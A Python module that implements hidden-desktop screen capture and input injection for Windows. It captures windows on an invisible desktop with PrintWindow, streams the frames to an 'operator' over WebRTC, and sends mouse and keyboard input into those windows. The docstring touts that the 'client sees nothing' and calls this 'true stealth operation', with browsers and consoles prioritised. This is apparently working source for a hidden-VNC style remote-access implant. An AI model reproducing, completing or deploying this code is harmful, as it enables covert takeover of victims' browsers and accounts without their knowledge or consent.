"""PrintWindow-based capture for hidden desktop windows.

This module provides screen capture without requiring visibility on the physical
display. Windows are captured directly using PrintWindow API, then composited
into a single frame.

Advantages:
- No driver installation required
- Works with hidden desktop windows
- Client sees nothing on their screen
- True stealth operation

How it works:
1. EnumDesktopWindows finds all windows on hidden desktop
2. PrintWindow captures each window's bitmap directly
3. Windows are composited based on Z-order
4. Result is sent to operator through WebRTC
"""
from __future__ import annotations

import ctypes
import logging
import threading
import time
from ctypes import wintypes
from dataclasses import dataclass, field
from typing import Callable

logger = logging.getLogger(__name__)

# Define LRESULT if not available in wintypes (Python compatibility)
if not hasattr(wintypes, 'LRESULT'):
    if ctypes.sizeof(ctypes.c_void_p) == 8:
        wintypes.LRESULT = ctypes.c_longlong
    else:
        wintypes.LRESULT = ctypes.c_long

# Windows API constants
SRCCOPY = 0x00CC0020
DIB_RGB_COLORS = 0
BI_RGB = 0
PW_CLIENTONLY = 0x1
PW_RENDERFULLCONTENT = 0x2

GWL_STYLE = -16
GWL_EXSTYLE = -20
WS_VISIBLE = 0x10000000
WS_MINIMIZE = 0x20000000
WS_EX_TOOLWINDOW = 0x00000080
WS_EX_NOACTIVATE = 0x08000000

SW_SHOW = 5
SW_SHOWNOACTIVATE = 4
SW_RESTORE = 9

SWP_NOACTIVATE = 0x0010
SWP_NOZORDER = 0x0004
SWP_SHOWWINDOW = 0x0040

HWND_TOP = 0

# Initialize Windows API
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32


class RECT(ctypes.Structure):
    _fields_ = [
        ("left", wintypes.LONG),
        ("top", wintypes.LONG),
        ("right", wintypes.LONG),
        ("bottom", wintypes.LONG),
    ]


class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize", wintypes.DWORD),
        ("biWidth", wintypes.LONG),
        ("biHeight", wintypes.LONG),
        ("biPlanes", wintypes.WORD),
        ("biBitCount", wintypes.WORD),
        ("biCompression", wintypes.DWORD),
        ("biSizeImage", wintypes.DWORD),
        ("biXPelsPerMeter", wintypes.LONG),
        ("biYPelsPerMeter", wintypes.LONG),
        ("biClrUsed", wintypes.DWORD),
        ("biClrImportant", wintypes.DWORD),
    ]


class BITMAPINFO(ctypes.Structure):
    _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]


class WINDOWPLACEMENT(ctypes.Structure):
    _fields_ = [
        ("length", wintypes.UINT),
        ("flags", wintypes.UINT),
        ("showCmd", wintypes.UINT),
        ("ptMinPosition", wintypes.POINT),
        ("ptMaxPosition", wintypes.POINT),
        ("rcNormalPosition", RECT),
    ]


# Function signatures
user32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
user32.GetWindowRect.restype = wintypes.BOOL
user32.GetClientRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
user32.GetClientRect.restype = wintypes.BOOL
user32.GetWindowDC.argtypes = [wintypes.HWND]
user32.GetWindowDC.restype = wintypes.HDC
user32.GetDC.argtypes = [wintypes.HWND]
user32.GetDC.restype = wintypes.HDC
user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
user32.ReleaseDC.restype = wintypes.INT
user32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
user32.PrintWindow.restype = wintypes.BOOL
user32.IsWindowVisible.argtypes = [wintypes.HWND]
user32.IsWindowVisible.restype = wintypes.BOOL
user32.IsIconic.argtypes = [wintypes.HWND]
user32.IsIconic.restype = wintypes.BOOL
user32.GetWindowLongW.argtypes = [wintypes.HWND, wintypes.INT]
user32.GetWindowLongW.restype = wintypes.LONG
user32.GetWindowTextW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
user32.GetWindowTextW.restype = wintypes.INT
user32.GetWindowTextLengthW.argtypes = [wintypes.HWND]
user32.GetWindowTextLengthW.restype = wintypes.INT
user32.GetClassNameW.argtypes = [wintypes.HWND, wintypes.LPWSTR, wintypes.INT]
user32.GetClassNameW.restype = wintypes.INT
user32.EnumDesktopWindows.argtypes = [wintypes.HANDLE, ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
user32.EnumDesktopWindows.restype = wintypes.BOOL
user32.EnumWindows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
user32.EnumWindows.restype = wintypes.BOOL
user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
user32.SetThreadDesktop.restype = wintypes.BOOL
user32.GetThreadDesktop.argtypes = [wintypes.DWORD]
user32.GetThreadDesktop.restype = wintypes.HANDLE
user32.GetWindowPlacement.argtypes = [wintypes.HWND, ctypes.POINTER(WINDOWPLACEMENT)]
user32.GetWindowPlacement.restype = wintypes.BOOL
user32.ShowWindow.argtypes = [wintypes.HWND, wintypes.INT]
user32.ShowWindow.restype = wintypes.BOOL
user32.SetWindowPos.argtypes = [wintypes.HWND, wintypes.HWND, wintypes.INT, wintypes.INT, wintypes.INT, wintypes.INT, wintypes.UINT]
user32.SetWindowPos.restype = wintypes.BOOL
user32.SetForegroundWindow.argtypes = [wintypes.HWND]
user32.SetForegroundWindow.restype = wintypes.BOOL
user32.BringWindowToTop.argtypes = [wintypes.HWND]
user32.BringWindowToTop.restype = wintypes.BOOL
user32.GetDesktopWindow.argtypes = []
user32.GetDesktopWindow.restype = wintypes.HWND
user32.GetWindow.argtypes = [wintypes.HWND, wintypes.UINT]
user32.GetWindow.restype = wintypes.HWND
user32.WindowFromPoint.argtypes = [wintypes.POINT]
user32.WindowFromPoint.restype = wintypes.HWND
user32.GetAncestor.argtypes = [wintypes.HWND, wintypes.UINT]
user32.GetAncestor.restype = wintypes.HWND
user32.SendMessageW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
user32.SendMessageW.restype = wintypes.LRESULT
user32.PostMessageW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
user32.PostMessageW.restype = wintypes.BOOL

gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
gdi32.CreateCompatibleDC.restype = wintypes.HDC
gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
gdi32.SelectObject.restype = wintypes.HGDIOBJ
gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
gdi32.DeleteObject.restype = wintypes.BOOL
gdi32.DeleteDC.argtypes = [wintypes.HDC]
gdi32.DeleteDC.restype = wintypes.BOOL
gdi32.BitBlt.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT, wintypes.INT, wintypes.INT, wintypes.HDC, wintypes.INT, wintypes.INT, wintypes.DWORD]
gdi32.BitBlt.restype = wintypes.BOOL
gdi32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT, wintypes.UINT, wintypes.LPVOID, ctypes.POINTER(BITMAPINFO), wintypes.UINT]
gdi32.GetDIBits.restype = wintypes.INT
gdi32.CreateDIBSection.argtypes = [wintypes.HDC, ctypes.POINTER(BITMAPINFO), wintypes.UINT, ctypes.POINTER(wintypes.LPVOID), wintypes.HANDLE, wintypes.DWORD]
gdi32.CreateDIBSection.restype = wintypes.HBITMAP

kernel32.GetCurrentThreadId.argtypes = []
kernel32.GetCurrentThreadId.restype = wintypes.DWORD


GW_HWNDNEXT = 2
GW_HWNDPREV = 3
GA_ROOT = 2


@dataclass
class WindowInfo:
    """Information about a captured window."""
    hwnd: int
    title: str
    class_name: str
    rect: tuple[int, int, int, int]  # left, top, right, bottom
    visible: bool
    minimized: bool
    z_order: int = 0


@dataclass
class CapturedWindow:
    """A captured window with its bitmap data."""
    info: WindowInfo
    bitmap_data: bytes | None = None
    width: int = 0
    height: int = 0


def get_window_title(hwnd: int) -> str:
    """Get window title text."""
    length = user32.GetWindowTextLengthW(hwnd)
    if length == 0:
        return ""
    buffer = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buffer, length + 1)
    return buffer.value


def get_window_class(hwnd: int) -> str:
    """Get window class name."""
    buffer = ctypes.create_unicode_buffer(256)
    user32.GetClassNameW(hwnd, buffer, 256)
    return buffer.value


def get_window_rect(hwnd: int) -> tuple[int, int, int, int]:
    """Get window rectangle (left, top, right, bottom)."""
    rect = RECT()
    user32.GetWindowRect(hwnd, ctypes.byref(rect))
    return (rect.left, rect.top, rect.right, rect.bottom)


def is_window_visible(hwnd: int) -> bool:
    """Check if window is visible."""
    return bool(user32.IsWindowVisible(hwnd))


def is_window_minimized(hwnd: int) -> bool:
    """Check if window is minimized."""
    return bool(user32.IsIconic(hwnd))


def should_capture_window(hwnd: int) -> bool:
    """Determine if a window should be captured."""
    if not user32.IsWindowVisible(hwnd):
        return False
    
    # Skip minimized windows
    if user32.IsIconic(hwnd):
        return False
    
    # Get window style
    style = user32.GetWindowLongW(hwnd, GWL_STYLE)
    ex_style = user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
    
    # Skip tool windows
    if ex_style & WS_EX_TOOLWINDOW:
        return False
    
    # Check window has valid size
    rect = RECT()
    user32.GetWindowRect(hwnd, ctypes.byref(rect))
    width = rect.right - rect.left
    height = rect.bottom - rect.top
    
    if width <= 0 or height <= 0:
        return False
    
    # Skip windows that are too small
    if width < 50 or height < 50:
        return False
    
    # Check window title - skip empty titled windows except known classes
    title = get_window_title(hwnd)
    class_name = get_window_class(hwnd)
    
    # Always include these classes
    important_classes = {
        "Chrome_WidgetWin_1",  # Chrome, Brave, Edge Chromium
        "MozillaWindowClass",  # Firefox
        "CabinetWClass",  # Explorer
        "Notepad",
        "ConsoleWindowClass",  # CMD
        "CASCADIA_HOSTING_WINDOW_CLASS",  # Windows Terminal
    }
    
    if class_name in important_classes:
        return True
    
    # Skip untitled windows
    if not title:
        return False
    
    return True


def capture_window_bitmap(hwnd: int, use_client_area: bool = False) -> tuple[bytes | None, int, int]:
    """Capture a window using PrintWindow API.
    
    Args:
        hwnd: Window handle to capture
        use_client_area: If True, capture only client area
    
    Returns:
        Tuple of (bitmap_data_bgra, width, height)
    """
    rect = RECT()
    if use_client_area:
        user32.GetClientRect(hwnd, ctypes.byref(rect))
    else:
        user32.GetWindowRect(hwnd, ctypes.byref(rect))
    
    if use_client_area:
        width = rect.right
        height = rect.bottom
    else:
        width = rect.right - rect.left
        height = rect.bottom - rect.top
    
    if width <= 0 or height <= 0:
        return None, 0, 0
    
    # Get window DC
    hwnd_dc = user32.GetWindowDC(hwnd)
    if not hwnd_dc:
        return None, 0, 0
    
    try:
        # Create memory DC and bitmap
        mem_dc = gdi32.CreateCompatibleDC(hwnd_dc)
        if not mem_dc:
            return None, 0, 0
        
        try:
            bitmap = gdi32.CreateCompatibleBitmap(hwnd_dc, width, height)
            if not bitmap:
                return None, 0, 0
            
            try:
                old_bitmap = gdi32.SelectObject(mem_dc, bitmap)
                
                # Use PrintWindow with PW_RENDERFULLCONTENT for better capture
                flags = PW_RENDERFULLCONTENT if not use_client_area else (PW_CLIENTONLY | PW_RENDERFULLCONTENT)
                result = user32.PrintWindow(hwnd, mem_dc, flags)
                
                if not result:
                    # Fallback: try without PW_RENDERFULLCONTENT
                    flags = 0 if not use_client_area else PW_CLIENTONLY
                    result = user32.PrintWindow(hwnd, mem_dc, flags)
                
                if not result:
                    gdi32.SelectObject(mem_dc, old_bitmap)
                    return None, 0, 0
                
                # Prepare bitmap info for DIB extraction
                bmi = BITMAPINFO()
                bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
                bmi.bmiHeader.biWidth = width
                bmi.bmiHeader.biHeight = -height  # Top-down bitmap
                bmi.bmiHeader.biPlanes = 1
                bmi.bmiHeader.biBitCount = 32
                bmi.bmiHeader.biCompression = BI_RGB
                
                # Calculate buffer size
                buffer_size = width * height * 4
                buffer = ctypes.create_string_buffer(buffer_size)
                
                # Get the bitmap bits
                gdi32.GetDIBits(mem_dc, bitmap, 0, height, buffer, ctypes.byref(bmi), DIB_RGB_COLORS)
                
                gdi32.SelectObject(mem_dc, old_bitmap)
                
                return bytes(buffer), width, height
            finally:
                gdi32.DeleteObject(bitmap)
        finally:
            gdi32.DeleteDC(mem_dc)
    finally:
        user32.ReleaseDC(hwnd, hwnd_dc)


class WindowEnumerator:
    """Enumerates windows on a specific desktop."""
    
    def __init__(self, desktop_handle: int | None = None):
        self._desktop_handle = desktop_handle
        self._windows: list[WindowInfo] = []
    
    def enumerate(self) -> list[WindowInfo]:
        """Enumerate all capturable windows on the desktop."""
        self._windows = []
        z_order = 0
        
        @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
        def enum_callback(hwnd: int, lparam: int) -> bool:
            nonlocal z_order
            if should_capture_window(hwnd):
                rect = get_window_rect(hwnd)
                info = WindowInfo(
                    hwnd=hwnd,
                    title=get_window_title(hwnd),
                    class_name=get_window_class(hwnd),
                    rect=rect,
                    visible=is_window_visible(hwnd),
                    minimized=is_window_minimized(hwnd),
                    z_order=z_order,
                )
                self._windows.append(info)
                z_order += 1
            return True
        
        if self._desktop_handle:
            user32.EnumDesktopWindows(self._desktop_handle, enum_callback, 0)
        else:
            user32.EnumWindows(enum_callback, 0)
        
        return self._windows


class WindowCompositor:
    """Composites multiple captured windows into a single frame."""
    
    def __init__(self, width: int = 1920, height: int = 1080):
        self._width = width
        self._height = height
        self._background_color = (30, 30, 30, 255)  # Dark gray BGRA
    
    @property
    def size(self) -> tuple[int, int]:
        return (self._width, self._height)
    
    def set_size(self, width: int, height: int) -> None:
        self._width = max(640, width)
        self._height = max(480, height)
    
    def composite(self, windows: list[CapturedWindow]) -> bytes:
        """Composite multiple windows into a single BGRA frame.
        
        Windows are drawn in reverse z-order (bottom to top).
        """
        # Create background buffer
        frame_size = self._width * self._height * 4
        frame = bytearray(frame_size)
        
        # Fill with background color
        bg = bytes(self._background_color)
        for i in range(0, frame_size, 4):
            frame[i:i+4] = bg
        
        # Sort windows by z-order (reverse - highest z_order drawn first, lowest on top)
        sorted_windows = sorted(windows, key=lambda w: -w.info.z_order)
        
        for window in sorted_windows:
            if not window.bitmap_data:
                continue
            
            self._blit_window(frame, window)
        
        return bytes(frame)
    
    def _blit_window(self, frame: bytearray, window: CapturedWindow) -> None:
        """Blit a window bitmap onto the frame."""
        left, top, right, bottom = window.info.rect
        win_width = window.width
        win_height = window.height
        
        # Adjust for compositor bounds
        if left >= self._width or top >= self._height:
            return
        if right <= 0 or bottom <= 0:
            return
        
        # Clip to frame bounds
        src_x = max(0, -left)
        src_y = max(0, -top)
        dst_x = max(0, left)
        dst_y = max(0, top)
        
        copy_width = min(win_width - src_x, self._width - dst_x)
        copy_height = min(win_height - src_y, self._height - dst_y)
        
        if copy_width <= 0 or copy_height <= 0:
            return
        
        # Copy pixels row by row
        for y in range(copy_height):
            src_row = src_y + y
            dst_row = dst_y + y
            
            src_offset = (src_row * win_width + src_x) * 4
            dst_offset = (dst_row * self._width + dst_x) * 4
            
            src_end = src_offset + copy_width * 4
            dst_end = dst_offset + copy_width * 4
            
            if src_end <= len(window.bitmap_data) and dst_end <= len(frame):
                frame[dst_offset:dst_end] = window.bitmap_data[src_offset:src_end]


class WindowCaptureSession:
    """Manages continuous capture of windows on a hidden desktop."""
    
    def __init__(
        self,
        desktop_handle: int | None = None,
        width: int = 1920,
        height: int = 1080,
        fps: int = 30,
    ):
        self._desktop_handle = desktop_handle
        self._enumerator = WindowEnumerator(desktop_handle)
        self._compositor = WindowCompositor(width, height)
        self._fps = max(1, fps)
        self._interval = 1.0 / self._fps
        
        self._stop_event = threading.Event()
        self._frame_lock = threading.Lock()
        self._frame: bytes | None = None
        self._frame_size = (width, height)
        
        self._windows_lock = threading.Lock()
        self._window_list: list[WindowInfo] = []
        
        self._thread: threading.Thread | None = None
        self._started = False
    
    @property
    def frame_size(self) -> tuple[int, int]:
        return self._frame_size
    
    @property
    def windows(self) -> list[WindowInfo]:
        """Get list of currently tracked windows."""
        with self._windows_lock:
            return list(self._window_list)
    
    def set_fps(self, fps: int) -> None:
        self._fps = max(1, fps)
        self._interval = 1.0 / self._fps
    
    def set_size(self, width: int, height: int) -> None:
        self._compositor.set_size(width, height)
        self._frame_size = self._compositor.size
    
    def get_frame(self, timeout: float = 0.5) -> tuple[bytes | None, tuple[int, int]]:
        """Get the latest captured frame."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._frame_lock:
                if self._frame is not None:
                    return self._frame, self._frame_size
            time.sleep(0.01)
        return None, self._frame_size
    
    def start(self) -> None:
        """Start the capture thread."""
        if self._started:
            return
        self._started = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._capture_loop, daemon=True)
        self._thread.start()
    
    def stop(self) -> None:
        """Stop the capture thread."""
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        self._started = False
    
    def _capture_loop(self) -> None:
        """Main capture loop."""
        logger.info("Window capture started (PrintWindow mode)")
        
        # If we have a desktop handle, switch to that desktop
        original_desktop = None
        if self._desktop_handle:
            try:
                thread_id = kernel32.GetCurrentThreadId()
                original_desktop = user32.GetThreadDesktop(thread_id)
                if not user32.SetThreadDesktop(self._desktop_handle):
                    logger.warning("Failed to switch to hidden desktop for capture")
            except Exception as exc:
                logger.warning("Desktop switch failed: %s", exc)
        
        try:
            while not self._stop_event.is_set():
                start_time = time.monotonic()
                
                try:
                    # Enumerate windows
                    windows = self._enumerator.enumerate()
                    
                    with self._windows_lock:
                        self._window_list = windows
                    
                    # Capture each window
                    captured_windows: list[CapturedWindow] = []
                    for win_info in windows:
                        bitmap_data, width, height = capture_window_bitmap(win_info.hwnd)
                        if bitmap_data:
                            captured_windows.append(CapturedWindow(
                                info=win_info,
                                bitmap_data=bitmap_data,
                                width=width,
                                height=height,
                            ))
                    
                    # Composite into single frame
                    if captured_windows:
                        frame = self._compositor.composite(captured_windows)
                    else:
                        # Create empty frame if no windows
                        frame = self._create_empty_frame()
                    
                    with self._frame_lock:
                        self._frame = frame
                        self._frame_size = self._compositor.size
                
                except Exception as exc:
                    logger.debug("Capture cycle error: %s", exc)
                
                # Maintain frame rate
                elapsed = time.monotonic() - start_time
                sleep_time = max(0, self._interval - elapsed)
                if sleep_time > 0:
                    self._stop_event.wait(sleep_time)
        
        finally:
            # Restore original desktop
            if original_desktop:
                try:
                    user32.SetThreadDesktop(original_desktop)
                except Exception:
                    pass
    
    def _create_empty_frame(self) -> bytes:
        """Create an empty frame with background color."""
        width, height = self._compositor.size
        frame_size = width * height * 4
        frame = bytearray(frame_size)
        bg = bytes([30, 30, 30, 255])  # Dark gray BGRA
        for i in range(0, frame_size, 4):
            frame[i:i+4] = bg
        return bytes(frame)


class WindowInputController:
    """Sends input to windows on hidden desktop using SendMessage/PostMessage."""
    
    # Windows messages
    WM_MOUSEMOVE = 0x0200
    WM_LBUTTONDOWN = 0x0201
    WM_LBUTTONUP = 0x0202
    WM_RBUTTONDOWN = 0x0204
    WM_RBUTTONUP = 0x0205
    WM_MBUTTONDOWN = 0x0207
    WM_MBUTTONUP = 0x0208
    WM_MOUSEWHEEL = 0x020A
    WM_KEYDOWN = 0x0100
    WM_KEYUP = 0x0101
    WM_CHAR = 0x0102
    WM_SETFOCUS = 0x0007
    WM_ACTIVATE = 0x0006
    WM_KILLFOCUS = 0x0008
    
    MK_LBUTTON = 0x0001
    MK_RBUTTON = 0x0002
    MK_MBUTTON = 0x0010
    
    WA_ACTIVE = 1
    
    def __init__(self, window_list_provider: Callable[[], list[WindowInfo]]):
        self._get_windows = window_list_provider
        self._active_hwnd: int | None = None
        self._mouse_buttons_down = 0
    
    def _find_window_at(self, x: int, y: int) -> int | None:
        """Find the topmost window at given coordinates."""
        windows = self._get_windows()
        # Windows are sorted by z_order, lowest z_order = topmost
        for win in sorted(windows, key=lambda w: w.z_order):
            left, top, right, bottom = win.rect
            if left <= x < right and top <= y < bottom:
                return win.hwnd
        return None
    
    def _make_lparam(self, x: int, y: int, hwnd: int) -> int:
        """Create LPARAM for mouse messages (client coordinates)."""
        # Convert screen coords to window client coords
        left, top, _, _ = get_window_rect(hwnd)
        client_x = x - left
        client_y = y - top
        # LPARAM is LOWORD=x, HIWORD=y
        return (client_y << 16) | (client_x & 0xFFFF)
    
    def _activate_window(self, hwnd: int) -> None:
        """Activate a window for input."""
        if hwnd and hwnd != self._active_hwnd:
            # Deactivate old window
            if self._active_hwnd:
                user32.PostMessageW(self._active_hwnd, self.WM_KILLFOCUS, 0, 0)
            
            # Activate new window
            user32.PostMessageW(hwnd, self.WM_ACTIVATE, self.WA_ACTIVE, 0)
            user32.PostMessageW(hwnd, self.WM_SETFOCUS, 0, 0)
            self._active_hwnd = hwnd
    
    def mouse_move(self, x: int, y: int) -> None:
        """Move mouse to position."""
        hwnd = self._find_window_at(x, y)
        if hwnd:
            lparam = self._make_lparam(x, y, hwnd)
            user32.PostMessageW(hwnd, self.WM_MOUSEMOVE, self._mouse_buttons_down, lparam)
    
    def mouse_down(self, x: int, y: int, button: str = "left") -> None:
        """Press mouse button."""
        hwnd = self._find_window_at(x, y)
        if not hwnd:
            return
        
        self._activate_window(hwnd)
        lparam = self._make_lparam(x, y, hwnd)
        
        if button == "left":
            self._mouse_buttons_down |= self.MK_LBUTTON
            user32.PostMessageW(hwnd, self.WM_LBUTTONDOWN, self._mouse_buttons_down, lparam)
        elif button == "right":
            self._mouse_buttons_down |= self.MK_RBUTTON
            user32.PostMessageW(hwnd, self.WM_RBUTTONDOWN, self._mouse_buttons_down, lparam)
        elif button == "middle":
            self._mouse_buttons_down |= self.MK_MBUTTON
            user32.PostMessageW(hwnd, self.WM_MBUTTONDOWN, self._mouse_buttons_down, lparam)
    
    def mouse_up(self, x: int, y: int, button: str = "left") -> None:
        """Release mouse button."""
        hwnd = self._find_window_at(x, y)
        if not hwnd:
            return
        
        lparam = self._make_lparam(x, y, hwnd)
        
        if button == "left":
            self._mouse_buttons_down &= ~self.MK_LBUTTON
            user32.PostMessageW(hwnd, self.WM_LBUTTONUP, self._mouse_buttons_down, lparam)
        elif button == "right":
            self._mouse_buttons_down &= ~self.MK_RBUTTON
            user32.PostMessageW(hwnd, self.WM_RBUTTONUP, self._mouse_buttons_down, lparam)
        elif button == "middle":
            self._mouse_buttons_down &= ~self.MK_MBUTTON
            user32.PostMessageW(hwnd, self.WM_MBUTTONUP, self._mouse_buttons_down, lparam)
    
    def mouse_click(self, x: int, y: int, button: str = "left") -> None:
        """Click at position."""
        self.mouse_down(x, y, button)
        time.sleep(0.02)
        self.mouse_up(x, y, button)
    
    def mouse_scroll(self, x: int, y: int, delta_x: int, delta_y: int) -> None:
        """Scroll at position."""
        hwnd = self._find_window_at(x, y)
        if not hwnd:
            return
        
        # WPARAM: HIWORD = wheel delta (positive = up), LOWORD = key state
        # LPARAM: screen coordinates
        if delta_y != 0:
            wparam = (delta_y << 16) | self._mouse_buttons_down
            lparam = (y << 16) | (x & 0xFFFF)
            user32.PostMessageW(hwnd, self.WM_MOUSEWHEEL, wparam, lparam)
    
    def key_down(self, vk_code: int, scan_code: int = 0) -> None:
        """Press key."""
        hwnd = self._active_hwnd or (self._get_windows()[0].hwnd if self._get_windows() else None)
        if hwnd:
            # LPARAM: repeat count (1), scan code, extended key flag, etc.
            lparam = 1 | (scan_code << 16)
            user32.PostMessageW(hwnd, self.WM_KEYDOWN, vk_code, lparam)
    
    def key_up(self, vk_code: int, scan_code: int = 0) -> None:
        """Release key."""
        hwnd = self._active_hwnd or (self._get_windows()[0].hwnd if self._get_windows() else None)
        if hwnd:
            # LPARAM with key-up flags
            lparam = 1 | (scan_code << 16) | (1 << 30) | (1 << 31)
            user32.PostMessageW(hwnd, self.WM_KEYUP, vk_code, lparam)
    
    def type_char(self, char: str) -> None:
        """Type a character."""
        hwnd = self._active_hwnd or (self._get_windows()[0].hwnd if self._get_windows() else None)
        if hwnd and char:
            user32.PostMessageW(hwnd, self.WM_CHAR, ord(char), 0)
    
    def type_text(self, text: str) -> None:
        """Type a string of characters."""
        for char in text:
            self.type_char(char)
            time.sleep(0.01)
